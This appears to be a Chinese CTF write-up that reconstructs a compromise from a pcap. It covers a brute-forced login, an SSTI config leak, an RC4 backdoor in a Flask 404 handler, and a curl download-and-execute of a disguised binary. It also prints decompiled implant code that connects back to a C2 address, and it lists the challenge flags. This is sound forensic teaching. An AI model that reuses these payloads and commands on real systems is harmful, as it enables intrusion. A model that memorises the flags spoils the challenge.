> 把流量分析和 AI 安全都算在这里了。

## 流量分析

> [!question] 题目描述
> 
> 近期发现公司网络出口出现了异常的通信，现需要通过分析出口流量包，对失陷服务器进行定位。现在需要你从网络攻击数据包中找出漏洞攻击的会话，分析会话编写exp或数据包重放，查找服务器上安装的后门木马，然后分析木马外联地址和通信密钥以及木马启动项位置。（附件 attack.pcap）

### 1. 攻击者爆破成功的后台密码是什么？

通过分析HTTP POST请求到/admin/login，发现大量登录尝试。找到frame 27966和28397成功登录（返回302重定向到/admin/panel）：

`username=admin&password=zxcvbnm123`

> [!flag]- 
> 
> flag{zxcvbnm123}

### 2. 攻击者通过漏洞利用获取Flask应用的 SECRET_KEY

在frame 28820，攻击者使用SSTI payload {{ config }} 获取Flask配置，服务器返回：

`SECRET_KEY: 'c6242af0-6891-4510-8432-e1cdf051f160'`

> [!flag]- 
> 
> flag{c6242af0-6891-4510-8432-e1cdf051f160}

### 3. 攻击者植入的木马使用的加密算法密钥字符串

> 攻击者植入的木马使用了加密算法来隐藏通讯内容。请分析注入Payload，给出该加密算法使用的密钥字符串(Key) ，结果提交形式：flag{xxxxxxxx}

通过多层解码frame 29180的SSTI payload（经过29层base64+zlib嵌套），得到最终的后门代码。该后门使用RC4加密算法，密钥为：

`RC4_SECRET = b'v1p3r_5tr1k3_k3y'`

后门通过404错误处理器注入，需要特定的X-Token-Auth头才能访问：3011aa21232beb7504432bfa90d32779

> [!flag]-
> 
> flag{v1p3r_5tr1k3_k3y}

### 4. 二进制后门文件名称

> 攻击者上传了一个二进制后门，请写出木马进程执行的本体文件的名称，结果提交形式：flag{xxxxx}，仅写文件名不加路径

攻击者通过RC4后门下载了shell.zip文件，解压后得到shell二进制文件，然后重命名为python3.13并执行。

执行的命令序列：

1. curl 192.168.1.201:8080/shell.zip -o /tmp/123.zip
2. unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip
3. mv /tmp/shell /tmp/python3.13
4. chmod +x /tmp/python3.13
5. /tmp/python3.13

> [!flag]- 
> 
> flag{python3.13}

### 5. 木马样本通信加密密钥（hex）

> 请提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥（hex，小写字母），结果提交形式：flag{[0-9a-f]+}

对提取出来的 shell 文件进行逆向分析，main里面

```c
fd = socket(2, 1, 0);
if ( fd < 0 )
  exit(1);
memset(&s, 48, sizeof(s));
s.sa_family = 2;
*(_DWORD *)&s.sa_data[2] = inet_addr("192.168.1.201");
*(_WORD *)s.sa_data = htons(58782u);          // 端口号
if ( connect(fd, &s, 0x10u) < 0 )
{
  close(fd);
  exit(1);
}
if ( (unsigned int)receive(fd, (__int64)&v7, 4uLL, 0) != 4 )
{
  close(fd);
  exit(1);
}
seed = (v7 >> 8) & 0xFF00 | (v7 << 8) & 0xFF0000 | (v7 << 24) | HIBYTE(v7);
srand(seed);
for ( i = 0; i <= 3; ++i )
  key[i] = rand();
gen_round_key((__int64)dec_round_key, (__int64)key, 0);
gen_round_key((__int64)enc_round_key, (__int64)key, 1);

```

![](https://raw.githubusercontent.com/darstib/public_imgs/utool/2512/28_251228-211702.png)

通过端口58782定位tcp session，定位三次握手之后的第一条服务器发送的包，找到seed初始值 0x34952046 按照算法，初始的key是
ac46fb610b313b4f32fc642d8834b456。 key数组实际上是: `0x61fb46ac 0x4f3b310b 0x2d64fc32 0x56b43488` 解密脚本：

```python

import struct
from ctypes import c_int32

class GlibcRand:
    def __init__(self):
        self.state = [0] * 344
        self.k = 0

    def srand(self, seed):
        self.state[0] = c_int32(seed).value
        for i in range(1, 31):
            val = self.state[i - 1]

            # Simplified python version for positive seed:
            self.state[i] = (16807 * self.state[i - 1]) % 2147483647

        for i in range(31, 34):
            self.state[i] = self.state[i - 31]

        self.k = 0
        for i in range(34, 344):
            self._rand_internal()

    def _rand_internal(self):
        # r[i] = r[i-31] + r[i-3]
        self.state[self.k] = (self.state[(self.k - 31) % 34] + self.state[(self.k - 3) % 34]) & 0xFFFFFFFF
        # Result is r[i] >> 1
        result = (self.state[self.k] >> 1) & 0x7FFFFFFF
        self.k = (self.k + 1) % 34
        return result

    def rand(self):
        return self._rand_internal()

def main():
    # Seed from pcap: 34952046
    # Hex: 0x34952046
    # Decimal: 882221126
    seed = 0x34952046

    print(f"Using seed: {seed} (0x{seed:08x})")

    rng = GlibcRand()
    rng.srand(seed)

    v8 = []
    for i in range(4):
        v8.append(rng.rand())

    print("v8 values:")
    for val in v8:
        print(f"0x{val:08x}")

    # Convert to bytes (Little Endian)
    key_bytes = struct.pack('<IIII', *v8)
    key_hex = key_bytes.hex()

    print(f"Key (hex): {key_hex}")
    print(f"Flag: flag{{{key_hex}}}")

if __name__ == "__main__":
    main()
```

## AI 安全

### The Silent Heist

生成微小扰动后的数据，提交：

> [!flag]- 
> 
> flag{c31b8c7e-a5e9-48ab-80c5-db45f3c36256}